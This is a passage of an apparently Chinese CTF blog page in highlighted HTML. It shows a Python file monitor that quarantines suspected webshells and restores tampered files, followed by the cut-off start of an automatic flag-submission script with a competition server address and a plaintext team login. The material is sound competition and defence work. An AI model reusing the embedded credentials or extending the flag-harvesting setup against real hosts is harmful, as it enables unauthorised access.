italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">hash</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Exception,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[!] getmd5_error : </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">e</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST.remove(filepath</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">FILE_MD5_DICT.pop(filepath,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">None</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">KeyError,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">pass</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 获取所有文件MD5</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilemd5dict</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filelist</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> []</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">filemd5dict</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&#123;&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> ori_file </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> filelist:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Special_path_str</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ori_file:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">md5</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">calcMD5</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.realpath(ori_file</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">md5:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">filemd5dict[ori_file]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">md5</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filemd5dict</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 备份所有文件</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">backup_file</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">filelist</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">[]</span><span style=\"color: #BABED8\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> filepath </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> filelist:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Special_path_str</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filepath:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">shutil.copy2(filepath,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Special_path[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">bak</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">]</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">__name__</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">__main__</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">---------start------------</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> value </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> Special_path:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">mkdir_p(Special_path[value]</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilelist</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">CWD</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">FILE_MD5_DICT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilemd5dict</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">backup_file(ORIGIN_FILE_LIST</span><span style=\"color: #BABED8\">) </span><span style=\"color: #676E95; font-style: italic\"># TODO 备份文件可能会产生重名BUG</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[*] pre work end!</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">while</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">True:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">file_list</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilelist</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">CWD</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># 移除新上传文件</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">diff_file_list</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">list</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">set</span><span style=\"color: #BABED8\">(file_list</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">^</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">len(diff_file_list</span><span style=\"color: #BABED8\">) </span><span style=\"color: #89DDFF\">!</span><span style=\"color: #BABED8\">= </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #676E95; font-style: italic\"># import pdb;pdb.set_trace()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> filepath </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> diff_file_list:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">r</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">.read</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Exception,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Special_string</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">f:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[*] webshell find : </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">shutil.move(filepath,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.join</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">Special_path[</span><span style=\"color: #FFCB6B\">&#39;webshell&#39;</span><span style=\"color: #FFCB6B\">],</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ntpath.basename</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Exception</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">as</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[!] move webshell error, &quot;%s&quot; maybe is webshell.</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">%getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(Special_path[</span><span style=\"color: #FFCB6B\">&#39;log&#39;</span><span style=\"color: #FFCB6B\">],</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">log.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">f.write(</span><span style=\"color: #FFCB6B\">&#39;newfile: &#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> : </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">time.ctime</span><span style=\"color: #89DDFF\">())</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">f.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    except Exception as e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        print u&#39;[-] log error : file move error: &#39; + getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">e</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># 防止任意文件被修改,还原被修改文件</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">md5_dict</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilemd5dict</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> filekey </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> md5_dict:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">md5_dict[filekey]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">!=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">FILE_MD5_DICT[filekey]:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">r</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">.read</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Exception,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Special_string</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">f:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[*] file had be change : </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">shutil.move(filekey,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.join</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">Special_path[</span><span style=\"color: #FFCB6B\">&#39;difffile&#39;</span><span style=\"color: #FFCB6B\">],</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ntpath.basename</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">shutil.move(os.path.join(Special_path[</span><span style=\"color: #FFCB6B\">&#39;bak&#39;</span><span style=\"color: #FFCB6B\">],</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ntpath.basename</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">), filekey)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Exception</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">as</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">u</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">[!] move webshell error, &quot;%s&quot; maybe is webshell.</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">%getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">f</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(Special_path[</span><span style=\"color: #FFCB6B\">&#39;log&#39;</span><span style=\"color: #FFCB6B\">],</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">log.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">f.write(</span><span style=\"color: #FFCB6B\">&#39;diff_file: &#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> : </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">time.ctime</span><span style=\"color: #89DDFF\">())</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #82AAFF\">f.close</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    except Exception as e:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        print u&#39;[-] log error : done_diff: &#39; + getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filekey</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                        </span><span style=\"color: #FFCB6B\">pass</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        time.sleep</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">2</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># print &#39;[*] &#39; + getUnicode(time.ctime())</span></span></code></pre></div><h3 id=\"自动提交flag\"><a href=\"#自动提交flag\" class=\"headerlink\" title=\"自动提交flag\"></a>自动提交flag</h3><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">re</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">requests</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">json</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">time</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">host</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">http://120.26.140.18:8000</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">target_host</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">http://120.26.140.18:%d</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">submit_url</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">http://120.26.140.18:8000/api/v1/challenges/attempt</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">id</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">4</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">username</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Team2</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">password</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">adminadmin</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: 